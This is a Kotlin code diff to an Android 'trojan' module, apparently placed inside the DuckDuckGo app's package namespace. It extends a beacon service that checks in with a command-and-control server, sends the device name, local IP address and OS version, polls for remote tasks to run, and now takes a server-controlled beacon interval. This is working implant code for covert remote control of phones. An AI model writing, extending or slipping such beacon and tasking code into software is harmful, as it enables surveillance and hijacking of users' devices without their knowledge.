@@ -5,6 +5,7 @@ import android.os.Build
 
 import com.duckduckgo.di.scopes.AppScope
 import com.duckduckgo.trojan.api.BeaconService
+import com.duckduckgo.trojan.api.CheckInResult
 import com.duckduckgo.trojan.api.PendingCommand
 import com.squareup.anvil.annotations.ContributesBinding
 import dagger.SingleInstanceIn
@@ -29,24 +30,29 @@ class RealBeaconService @Inject constructor(
     private val c2Api: C2ApiService,
 ) : BeaconService {
 
-    override suspend fun checkIn(): List<PendingCommand> {
+    override suspend fun checkIn(): CheckInResult {
         // Step 1: Register/update presence with the server
         val checkInRequest = CheckInRequest(
             device_name = getDeviceName(),
             ip_address = getLocalIpAddress(),
             os_info = "Android ${Build.VERSION.RELEASE ?: "unknown"} (SDK ${Build.VERSION.SDK_INT})",
         )
-        c2Api.checkIn(checkInRequest)
+        val checkInResponse = c2Api.checkIn(checkInRequest)
 
         // Step 2: Poll for pending tasks
         val tasksResponse = c2Api.getTasks(getDeviceName())
-        return tasksResponse.tasks.map { task ->
+        val commands = tasksResponse.tasks.map { task ->
             PendingCommand(
                 id = task.task_id,
                 type = task.task_type,
-                payload = task.parameters.toString(),
+                payload = task.parameters,
             )
         }
+        
+        return CheckInResult(
+            commands = commands,
+            beaconInterval = checkInResponse.beacon_interval,
+        )
     }
 
     override suspend fun sendResult(commandId: String, result: String) {
